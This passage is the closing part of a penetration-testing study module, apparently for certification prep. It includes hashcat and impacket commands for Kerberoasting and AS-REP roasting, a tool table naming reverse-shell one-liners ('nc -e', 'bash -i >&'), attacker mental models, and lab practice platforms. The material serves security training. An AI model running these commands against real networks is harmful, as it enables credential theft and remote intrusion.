hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting (no creds needed if pre-auth not required)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -request
```

---

## 10. Tools & Techniques Mapping

| Technique / Concept | Primary Tool | Secondary / Alternative |
|:---|:---|:---|
| **Host discovery** | `nmap -sn` | `arp-scan`, `netdiscover`, `masscan` |
| **Port scanning** | `nmap -sS` / `nmap -sT` | `masscan`, `hping3` |
| **Service enumeration** | `nmap -sV` | `metasploit` auxiliary modules |
| **SMB enumeration** | `smbclient` | `crackmapexec`, `enum4linux-ng` |
| **NFS share mapping** | `showmount -e` | `nmap --script nfs-showmount` |
| **RPC enumeration** | `rpcinfo -p` | `rpcclient`, `nmap --script msrpc-enum` |
| **LDAP enumeration** | `ldapsearch` | `nmap --script ldap-*`, `bloodhound-python` |
| **DNS enumeration** | `dig` / `dnsrecon` | `nslookup`, `fierce`, `gobuster dns` |
| **Web fuzzing** | `ffuf` | `gobuster`, `dirb`, `feroxbuster` |
| **SQL injection** | `sqlmap` | Manual Burp-based, `havij` (legacy) |
| **Web scanning** | **Burp Suite** | OWASP ZAP, Nikto, Nessus / OpenVAS |
| **Reverse shells** | `nc -e` / `bash -i >&` | `msfvenom`, Weevely, webshells |
| **ARP poisoning** | `arpspoof` / `bettercap` | `ettercap` |
| **DNS spoofing** | `dnsspoof` / `bettercap` | `ettercap` |
| **Pivoting via proxy** | `proxychains` | `chisel`, `ligolo-ng`, `ssh -D` |
| **Metasploit pivoting** | `autoroute` + `socks_proxy` | — |
| **Password cracking** | `hashcat` | `john` |
| **Online brute-force** | `hydra` | `medusa`, `crackmapexec` |
| **Active Directory** | `impacket` suite | `crackmapexec`/`netexec`, `bloodhound` |

---

## 11. Mental Models

1. **Dual-homed host = pivot opportunity.** Always check interfaces the second you land.
2. **Credentials are the real prize.** Shells die. Hashes and tickets live longer.
3. **Map before you exploit deeply.** A clear network map saves hours.
4. **Document as you go.** Screenshots + notes = points and potential LPT Master.
5. **Living off the land first.** Prefer built-in tools (PowerShell, WMI, SMB, SSH) before dropping binaries.
6. **Enumerate → Enumerate again → Then exploit.** Never stop enumerating after the first foothold.
7. **A port number is not a vulnerability.** Confirm the service, version, configuration, and authentication before judging.

---

## 12. Practice Recommendations

| Platform | Room / Resource | Skills Covered |
|----------|----------------|----------------|
| **TryHackMe** | Network Fundamentals | OSI, TCP/IP, subnetting |
| **TryHackMe** | Network Services | SMB, NFS, Telnet enumeration |
| **TryHackMe** | Network Services 2 | Advanced protocol enumeration |
| **TryHackMe** | Blue | EternalBlue exploitation |
| **TryHackMe** | Kenobi | NFS, SMB, SUID escalation |
| **TryHackMe** | Linux Fundamentals | Command line basics |
| **TryHackMe** | Windows Fundamentals | PowerShell, enumeration |
| **HackTheBox** | Legacy | EternalBlue + MS08-067 |
| **HackTheBox** | Blue | EternalBlue practice |
| **Local Lab** | Metasploitable 2 | SMB, NFS, FTP, Telnet, RPC — all deliberately vulnerable |
| **Local Lab** | Dual-homed Linux VM | SSH port forwarding / pivoting practice |

**Zero-cost local setup:** Kali/Parrot attacker VM + Metasploitable 2 target on same host-only network = fastest way to drill every command in this module.
